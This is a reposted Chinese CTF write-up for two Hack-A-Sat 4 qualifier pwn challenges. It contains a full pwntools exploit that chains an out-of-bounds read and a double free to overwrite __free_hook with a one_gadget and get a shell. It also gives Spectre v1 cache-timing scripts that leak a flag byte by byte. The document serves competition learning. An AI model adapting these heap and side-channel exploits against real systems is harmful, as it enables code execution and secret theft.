# Hack-A-Sat 4 Qualifiers pwn部分题解

> 原文: https://www.ctfiot.com/113118.html
> ID: 113118

本文为看雪论坛优秀文章

看雪论坛作者ID：X1ng

只解出来一道题，复现了一下幽灵攻击。

一

Magic Space Bussin

题目描述

I hate embedded SWEs. Always talking about how you should preallocate all the memory you need in the data section if you’re using a bus. This isn’t the 90s anymore. The heap is bussin fr fr.

Don’t trust me? Fine. You’re more than welcome to test my spacebus implementation.

附件https://github.com/X1ngn/ctf/blob/master/magic_public.tar.gz

是一个模拟消息队列的程序，有两个管道，分别用队列保存消息，每个节点表示一个消息。

在程序解析十六进制消息时，会将2个字符解析为一个字节中的十六进制数，如果输入的字符数量为奇数，节点中设置信息时CalcPayloadLen函数会保存原来的长度，在读取信息时会根据节点中保存的长度输出内存中的数据，可以越界读。

SB_Msg* SB_Pipe::
ParsePayload(const std::
string& s, bool ishex, uint8_t pipe_id, uint8_t msg_id){
if(s.length() == 0){
return nullptr;
}

uint8_t* msg_s = AllocatePlBuff(ishex, s);

if(ishex){
char cur_byte[3] = {0};

for(size_t i = 0, j = 0; i < CalcPayloadLen(ishex, s); i+=2, j++){
cur_byte[0] = s[i];
cur_byte[1] = s[i+1];
msg_s[j] = static_cast(std::
strtol(cur_byte, nullptr, 16));
}
}
else{
for(size_t i = 0; i < CalcPayloadLen(ishex, s); i++){
msg_s[i] = static_cast(s[i]);
}
}

SB_Msg* payload = new SB_Msg{
msg_s,
pipe_id,
msg_id,
CalcPayloadLen(ishex, s)
};

return payload;
}

每个队列允许10个消息节点，在节点满时会直接delete节点数据所在的堆内存，而广播功能会复制节点数据后分别将消息放入两个队列，形成double free。

if(payload->pipe_id == UINT8_MAX){
if(this->msg_id_pipe_lens[payload->msg_id] <= this->msg_max_subs){
bool copy = true;
for(i = 0; i < this->msg_id_pipe_lens[payload->msg_id]; i++){
cur_pipe_num = this->msg_id_pipe_map[payload->msg_id][i];

if(i == (this->msg_id_pipe_lens[payload->msg_id]-1)){//如果是最后一个管道，则不copy
copy = false;
}

pipe = GetPipeByNum(cur_pipe_num);
if(pipe->SendMsgToPipe(payload, copy) != SB_SUCCESS){
LOG_ERR("Unable to send payload to Pipe Num: %dn", cur_pipe_num);
delete payload->data; //data大小可控 SB_Msg 0x30
ret = SB_FAIL;
}
}
if(i == 0){
LOG_ERR("No pipes subscribed to Msg ID: %dn", payload->msg_id);
delete payload->data;
ret = SB_FAIL;
}
payload->data = nullptr;
}
else{
LOG_ERR("Too many pipes subscribed to Msg ID: %d. Bailing out...n", payload->msg_id);
exit(-1);
}
}

由于在输入数据时，使用string保存用户输入数据，则可以输入很多字符，string会自动成倍扩充内存长度，足够大时会将堆内存释放到unsrted bin，再利用越界读泄露libc地址。

可以将第一个队列填满后广播，则试图插入第一个队列会释放存放节点数据的堆内存，第二个队列会正常插入节点，由于tcache不能直接double free，在fastbin中构造A->B->A的经典double free姿势，申请tcache时会将double free的堆块放入tcache，改free_hook完成利用。

#!/usr/bin/python3

from pwn import *
import sys
import time
context.log_level = 'debug'
context.arch='amd64'

def exp(ip, port):
local=0
binary_name='magic'
libc_name='libc-2.31.so'

libc=ELF("./"+libc_name)
e=ELF("./"+binary_name)

if local:
p=process("./"+binary_name)
else:
p=remote(ip,port)

def z(a=''):
if local:
gdb.attach(p,a)
if a=='':
raw_input
else:
pass

ru=lambda x:p.recvuntil(x)
sl=lambda x:p.sendline(x)
sd=lambda x:p.send(x)
sa=lambda a,b:p.sendafter(a,b)
sla=lambda a,b:p.sendlineafter(a,b)
ia=lambda :p.interactive()

def cho(choice):
ru('>')
sl(str(choice))

def post(msg_id, pipe_id, x, msg):
cho(1)
ru('msg_id:')
sl(str(msg_id))
ru('pipe_id:')
sl(str(pipe_id))
ru('hex:')
sl(str(x))
ru('post on bus:')
sl(msg)

def handle0():
cho(2)

def handle1():
cho(3)

'''
TEST_MSG=100,
GET_STARS=101, // NOT IMPLEMENTED UNTIL TESTING COMPLETE
NUM_STARS=102, // NOT IMPLEMENTED UNTIL TESTING COMPLETE
BRIGHTEST_STARS=103, // NOT IMPLEMENTED UNTIL TESTING COMPLETE
RESET=104, // NOT IMPLEMENTED UNTIL TESTING COMPLETE
CALIBRATE=105, // NOT IMPLEMENTED UNTIL TESTING COMPLETE
QUATERNION=106 // NOT IMPLEMENTED UNTIL TESTING COMPLETE
'''

if 0==local:
ru('Ticket please:n')
sl('ticket{}')

post(100, 1, 1, '1'*0x781)

handle1()
ru('0x1 0 0 0 0 0 0 0 0x21')

for i in range(23):
ru(' ')
heap=0
for i in range(6):
ru(' ')
tmp = int(p.recv(4)[2:],16)
heap = heap | (tmp<<(i*8))
log.info(hex(heap))

for i in range(10):
ru(' ')
libcbase=0
for i in range(6):
ru(' ')
tmp = int(p.recv(4)[2:],16)
libcbase = libcbase | (tmp<<(i*8))
libcbase -= 0x1ecbe0
log.info(hex(libcbase))

post(101, 0, 0, '2'*0x68)
for i in range(10):
post(101, 255, 0, '2'*0x68)

for i in range(9):
handle1()
for i in range(10):
handle0()
#tcache:
abbbbbb
#fastbin:
bbbb...
#h0:
#h1:a

for i in range(6):
post(101, 0, 0, '2'*0x68)
post(101, 1, 0, '2'*0x68)
post(101, 0, 0, '2'*0x68)
post(101, 0, 0, '2'*0x68)
#tcache:
#fastbin:
bbbb...
#h0:
bbbbbbbb
#h1:aa

for i in range(7):
handle0()
handle1()
handle0()
handle1()
#tcache:
bbbbbbb
#fastbin:
ababbbb...
#h0:
#h1:

free_hook = libc.symbols['__free_hook']+libcbase
log.info(hex(free_hook))
one = [0xe3afe, 0xe3b01, 0xe3b04]

for i in range(7):
post(101, 0, 0, '2'*0x68)

post(101, 1, 0, p64(free_hook)+b'2'*0x60)
post(101, 1, 0, b'2'*0x68)
post(101, 1, 0, b'2'*0x68)

post(101, 1, 0, p64(libcbase+one[1])+b'2'*0x60)
p.interactive()
return ''

if __name__ == "__main__":

flag = exp('magic.quals2023-kah5Aiv9.satellitesabove.me', 5300)

二

Spectrel Imaging

题目描述

This satellite has a spectral imaging payload. We managed to get our hands on the binary for the sequencer software that handles command sequences to the payload.

The processor will be Intel Skylake or Cascade Lake.

附件

按照描述应该是一个卫星程序，题目附件中还有一个stars.csv文件，在程序开始时读入，应该是保存一些星球的数据。

由于现代CPU为了提高效率会使用乱序发射指令，对于分支跳转指令有分支预测功能，即在执行指令时会预测之后会走的分支，提前（乱序）执行后面的代码，在真正执行到时若预测失败再将寄存器上下文信息复原，若预测成功则可以大大提高性能。

幽灵攻击是基于时间的侧信道攻击，首先要有array1[array2[i]]这样的访存语句（会对i进行一些数组越界检查），并且要清空所有的cache排除干扰，思路是提前执行一些指令去训练CPU的分支预测器，即多次循环都是满足检查条件正常访问内存，在最后攻击时访问目标不可访问的内存，而CPU乱序执行会按照之前的经验提前预测这次也可以访问，将此时的array1[array2[i]]读取出来，而实际上由于此时的i不符合检查，是不能访问的。

在真正执行到判断指令时发现预测失败，把寄存器等上下文都再恢复回原来的数据，执行正确的跳转，虽然内存和寄存器中都没有保存目标内存array1[array2[i]]中的数据，但是此时目标内存的数据由于被读取过，其所在的cache行已经被调到cache中，只要遍历[array1[i] for i in range(32, 127)]，这时如果cache命中，访问的时间会很短，以此作为概率去猜测i越界时array2[i]中的值。

逆向用到的一些编译器提供的函数：

void _mm_clflush(void const* p);清空p地址处所在的缓存

void _mm_mfence ();内存读写屏障，确保屏障前后的指令不会因为优化等原因乱序

逆向分析几个分支，可以大概猜到Scheduler类成员变量，在开始运行时读取flag放在0x1F516偏移处的内存中。

Scheduler {
int fd; // 0 /fpga/spectral
uint64_t padding; // 8
uint16_t Timing // 16
uint16_t seq_max; // 18 256
uint16_t star_max; // 20 0xFA
char stars[0xfA][0x200]; // 22
char padding[0x10];
char seq[0x100]; // 0x1F416
char flag[]; // 0x1F516
}

分支跳转太多时编译器会编译跳转为jmp rax，IDA就无法识别跳转，通过汇编可以看到各个分支。

0号函数：清空Scheduler类所在的缓存。

1号函数：依次访问0x1F416偏移处的seq数组中的所有元素。

2号函数：将Timing置0。

3号函数：将Timing置1。

4号函数：输入一个idx，访问0x1F416偏移处的seq数组中下标idx处的元素j（idx要小于seq_max，256，否则抛出异常），j作为22偏移处的stars二维数组（可以理解为字符串数组）的下标访问字符串，写入某个文件中。

5号函数：输入一个idx，访问22偏移处的stars字符串数组中下标idx处的字符串（idx要小于star_max，0xfa，否则抛出异常），写入某个文件中。

6号函数：输入2个数据保存到vector，前后分别是idx和value，用来设置0x1F416偏移处的seq数组中下标idx处的元素为value。

7号函数：输入一组数据保存到vector，分别用来执行4号函数的操作。

当Timing为1时每次操作都会计时。

利用思路是：

① 先清空所有的cache。

② 使用7号函数访问多次合法内存，训练分支预测器走合法不会抛出异常的分支。

③ 输入越界的idx，即使用flag[i]作为上述的j，由于乱序执行和被提前训练好的分支预测器，CPU会预先取出seq[flag[i]]并打算作为stars字符串数组的下标，在真正执行到判断条件时发现idx越界了，再恢复寄存器等上下文信息到未取出seq[flag[i]]时的样子，但是此时seq[flag[i]]已经在cache中了。

④ 开启计时，并依次访问所有字符串，用时最短的字符串说明cache命中，以此来猜测flag[i]的值。

⑤ 依次猜测每个i(0～32)的每一种可能(32~126)。

结合频道里赛后交流的佬们的思路写exp。

Generator.py

def emit_check(char_idx, char_val):
s = ""
for _ in range(0, 3):
s += "0n"
for i in range(0xf0, 0x100):
s += f"6n{i} 0n"
s += f"7n"
s += " ".join(map(str, [i for i in range(0xf0, 0x100)] + [0x100 + char_idx])) + "n"
s += f"3n"
s += f"5n"
s += f"{char_val}n"
s += f"2n"
return s

with open("submission", "w") as f:
for i in range(0, 120):
for j in range(0x20, 0x7f):
f.write(emit_check(i, j))

Test.py

repeat = 3
l = 120

flag = ''
with open("out", "r") as f:
f.readline()
f.readline()
for i in range(0, l):
time = []
for j in range(0x20, 0x7f):
s = 0
for _ in range(repeat):
s += int(f.readline()[8:], 10)
time.append(s/repeat)

flag += chr(32+time.index(min(time)))
print(flag)

取3次时间的平均，在本地可以泄露出flag，有时候也会有一些噪音。

$ python3 test.py
flag{ThisIsNotARealFlagButYouCanUseItToTest!!!!}hR^hL[Q=G9*?T4)hry&]dbqX,[q6l[.IDNg-qV

看雪ID：X1ng

https://bbs.kanxue.com/user-home-869963.htm

*本文由看雪论坛 X1ng 原创，转载请注明来自看雪社区

# 往期推荐

1、在 Windows下搭建LLVM 使用环境

2、深入学习smali语法

3、安卓加固脱壳分享

4、Flutter 逆向初探

5、一个简单实践理解栈空间转移

6、记一次某盾手游加固的脱壳与修复

球分享

球点赞

球在看


```
一
Magic Space Bussin
SB_Msg* SB_Pipe::
ParsePayload(const std::
string& s, bool ishex, uint8_t pipe_id, uint8_t msg_id){
if(s.length() == 0){
return nullptr;
}

uint8_t* msg_s = AllocatePlBuff(ishex, s);

if(ishex){
char cur_byte[3] = {0};

for(size_t i = 0, j = 0; i < CalcPayloadLen(ishex, s); i+=2, j++){
cur_byte[0] = s[i];
cur_byte[1] = s[i+1];
msg_s[j] = static_cast(std::
strtol(cur_byte, nullptr, 16));
}
}
else{
for(size_t i = 0; i < CalcPayloadLen(ishex, s); i++){
msg_s[i] = static_cast(s[i]);
}
}

SB_Msg* payload = new SB_Msg{
msg_s,
pipe_id,
msg_id,
CalcPayloadLen(ishex, s)
};

return payload;
}
if(payload->pipe_id == UINT8_MAX){
if(this->msg_id_pipe_lens[payload->msg_id] <= this->msg_max_subs){
bool copy = true;
for(i = 0; i < this->msg_id_pipe_lens[payload->msg_id]; i++){
cur_pipe_num = this->msg_id_pipe_map[payload->msg_id][i];

if(i == (this->msg_id_pipe_lens[payload->msg_id]-1)){//如果是最后一个管道，则不copy
copy = false;
}

pipe = GetPipeByNum(cur_pipe_num);
if(pipe->SendMsgToPipe(payload, copy) != SB_SUCCESS){
LOG_ERR("Unable to send payload to Pipe Num: %dn", cur_pipe_num);
delete payload->data; //data大小可控 SB_Msg 0x30
ret = SB_FAIL;
}
}
if(i == 0){
LOG_ERR("No pipes subscribed to Msg ID: %dn", payload->msg_id);
delete payload->data;
ret = SB_FAIL;
}
payload->data = nullptr;
}
else{
LOG_ERR("Too many pipes subscribed to Msg ID: %d. Bailing out...n", payload->msg_id);
exit(-1);
}
}
#!/usr/bin/python3

from pwn import *
import sys
import time
context.log_level = 'debug'
context.arch='amd64'

def exp(ip, port):
local=0
binary_name='magic'
libc_name='libc-2.31.so'

libc=ELF("./"+libc_name)
e=ELF("./"+binary_name)

if local:
p=process("./"+binary_name)
else:
p=remote(ip,port)

def z(a=''):
if local:
gdb.attach(p,a)
if a=='':
raw_input
else:
pass

ru=lambda x:p.recvuntil(x)
sl=lambda x:p.sendline(x)
sd=lambda x:p.send(x)
sa=lambda a,b:p.sendafter(a,b)
sla=lambda a,b:p.sendlineafter(a,b)
ia=lambda :p.interactive()

def cho(choice):
ru('>')
sl(str(choice))

def post(msg_id, pipe_id, x, msg):
cho(1)
ru('msg_id:')
sl(str(msg_id))
ru('pipe_id:')
sl(str(pipe_id))
ru('hex:')
sl(str(x))
ru('post on bus:')
sl(msg)

def handle0():
cho(2)

def handle1():
cho(3)

'''
TEST_MSG=100,
GET_STARS=101, // NOT IMPLEMENTED UNTIL TESTING COMPLETE
NUM_STARS=102, // NOT IMPLEMENTED UNTIL TESTING COMPLETE
BRIGHTEST_STARS=103, // NOT IMPLEMENTED UNTIL TESTING COMPLETE
RESET=104, // NOT IMPLEMENTED UNTIL TESTING COMPLETE
CALIBRATE=105, // NOT IMPLEMENTED UNTIL TESTING COMPLETE
QUATERNION=106 // NOT IMPLEMENTED UNTIL TESTING COMPLETE
'''

if 0==local:
ru('Ticket please:n')
sl('ticket{}')

post(100, 1, 1, '1'*0x781)

handle1()
ru('0x1 0 0 0 0 0 0 0 0x21')

for i in range(23):
ru(' ')
heap=0
for i in range(6):
ru(' ')
tmp = int(p.recv(4)[2:],16)
heap = heap | (tmp<<(i*8))
log.info(hex(heap))

for i in range(10):
ru(' ')
libcbase=0
for i in range(6):
ru(' ')
tmp = int(p.recv(4)[2:],16)
libcbase = libcbase | (tmp<<(i*8))
libcbase -= 0x1ecbe0
log.info(hex(libcbase))

post(101, 0, 0, '2'*0x68)
for i in range(10):
post(101, 255, 0, '2'*0x68)

for i in range(9):
handle1()
for i in range(10):
handle0()
    #tcache:
abbbbbb
    #fastbin:
bbbb...
    #h0:
    #h1:a

for i in range(6):
post(101, 0, 0, '2'*0x68)
post(101, 1, 0, '2'*0x68)
post(101, 0, 0, '2'*0x68)
post(101, 0, 0, '2'*0x68)
    #tcache:
    #fastbin:
bbbb...
    #h0:
bbbbbbbb
    #h1:aa

for i in range(7):
handle0()
handle1()
handle0()
handle1()
    #tcache:
bbbbbbb
    #fastbin:
ababbbb...
    #h0:
    #h1:

free_hook = libc.symbols['__free_hook']+libcbase
log.info(hex(free_hook))
one = [0xe3afe, 0xe3b01, 0xe3b04]

for i in range(7):
post(101, 0, 0, '2'*0x68)

post(101, 1, 0, p64(free_hook)+b'2'*0x60)
post(101, 1, 0, b'2'*0x68)
post(101, 1, 0, b'2'*0x68)

post(101, 1, 0, p64(libcbase+one[1])+b'2'*0x60)
p.interactive()
return ''

if __name__ == "__main__":

flag = exp('magic.quals2023-kah5Aiv9.satellitesabove.me', 5300)
二
Spectrel Imaging
Scheduler {
int fd; // 0 /fpga/spectral
uint64_t padding; // 8
uint16_t Timing // 16
uint16_t seq_max; // 18 256
uint16_t star_max; // 20 0xFA
char stars[0xfA][0x200]; // 22
char padding[0x10];
char seq[0x100]; // 0x1F416
char flag[]; // 0x1F516
}
def emit_check(char_idx, char_val):
s = ""
for _ in range(0, 3):
s += "0n"
for i in range(0xf0, 0x100):
s += f"6n{i} 0n"
s += f"7n"
s += " ".join(map(str, [i for i in range(0xf0, 0x100)] + [0x100 + char_idx])) + "n"
s += f"3n"
s += f"5n"
s += f"{char_val}n"
s += f"2n"
return s

with open("submission", "w") as f:
for i in range(0, 120):
for j in range(0x20, 0x7f):
f.write(emit_check(i, j))
repeat = 3
l = 120

flag = ''
with open("out", "r") as f:
f.readline()
f.readline()
for i in range(0, l):
time = []
for j in range(0x20, 0x7f):
s = 0
for _ in range(repeat):
s += int(f.readline()[8:], 10)
time.append(s/repeat)

flag += chr(32+time.index(min(time)))
print(flag)
$ python3 test.py
flag{ThisIsNotARealFlagButYouCanUseItToTest!!!!}hR^hL[Q=G9*?T4)hry&]dbqX,[q6l[.IDNg-qV
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/05/0-1682933188.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/05/1-1682933188.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/05/4-1682933189.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/05/0-1682933189.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/05/10-1682933190.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/05/5-1682933191.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/05/5-1682933191.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/05/3-1682933191.gif)